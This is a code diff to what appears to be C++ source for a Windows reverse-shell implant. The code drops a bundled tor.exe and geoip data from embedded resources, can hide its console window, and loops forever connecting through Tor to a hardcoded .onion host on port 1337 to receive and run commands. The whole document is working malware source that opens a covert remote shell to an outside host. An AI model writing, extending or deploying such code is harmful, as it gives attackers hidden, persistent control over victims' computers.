@@ -12,34 +12,43 @@ HMODULE GetCurrentModule() {
     return hModule;
 }
 
-void dropTor() {
-    // Get a pointer to tor.zip
+void writeResToDisk(std::string path, int r, int t){
     HMODULE hCurrentModule = GetCurrentModule();
-    HRSRC hTorExeRes = FindResource(hCurrentModule, MAKEINTRESOURCE(TOREXE), MAKEINTRESOURCE(EXEFILE));
-    HGLOBAL hTorExeData = LoadResource(hCurrentModule, hTorExeRes);
-    DWORD hTorExeSize = SizeofResource(hCurrentModule, hTorExeRes);
-    char* hTorExeFinal = (char*)LockResource(hTorExeData);
-    // Write hTorZipFinal to disk
-    std::ofstream torExeFile("tor.exe", std::ios::binary);
-    torExeFile.write(hTorExeFinal, hTorExeSize);
-    torExeFile.close();
+    HRSRC hRes = FindResource(hCurrentModule, MAKEINTRESOURCE(r), MAKEINTRESOURCE(t));
+    HGLOBAL hData = LoadResource(hCurrentModule, hRes);
+    DWORD hDataSize = SizeofResource(hCurrentModule, hRes);
+    char* hDataCharP = (char*)LockResource(hData);
+    // Write to disk at path
+    std::ofstream f(path, std::ios::binary);
+    f.write(hDataCharP, hDataSize);
+    f.close();
 }
 
-#define HOST "zd2j5murooa4imqzfa52ikp3rxsauti5fip4k4atppdbvpgdewzkwpyd.onion"
+/*
+    Drops tor.exe along with geoip data
+*/
+void dropTor() {
+    writeResToDisk("tor.exe", TOREXE, EXEFILE);
+    CreateDirectory(L".\\data", NULL);
+    writeResToDisk("data\\geoip", GEOIP, TEXTFILE);
+    writeResToDisk("data\\geoip6", GEOIP6, TEXTFILE);
+}
+
+#define HOST "lj3d2pro3db5wkrz7i3byeculryh4ykqvpnc7z6xfjiv7mwmi2is5yad.onion"
 #define showConsole true
 
 int main() {
     ShowWindow(GetConsoleWindow(), (showConsole) ? SW_SHOW : SW_HIDE);
 
     // Put TOR onto the disk if it isnt there already
-    if (GetFileAttributes(L"tor.exe") == INVALID_FILE_ATTRIBUTES) {
+    if (GetFileAttributes(L"tor.exe") == INVALID_FILE_ATTRIBUTES || GetFileAttributes(L"data\\geoip") == INVALID_FILE_ATTRIBUTES){
         dropTor();
     }
     
     // Hell loop of forever restarting TOR and trying to connect to the server :)
     // I could make it not restart TOR every time, but I had a few problems with that before
     while (1) {
-        torRevShellClient c(".\\tor.exe", HOST);
+        torRevShellClient c(".\\tor.exe", HOST, 1337);
         c.startProxy();
         c.attemptConnect();
         c.cmdProcessLoop(); // If attemptConnect() fails, this function will return immediately
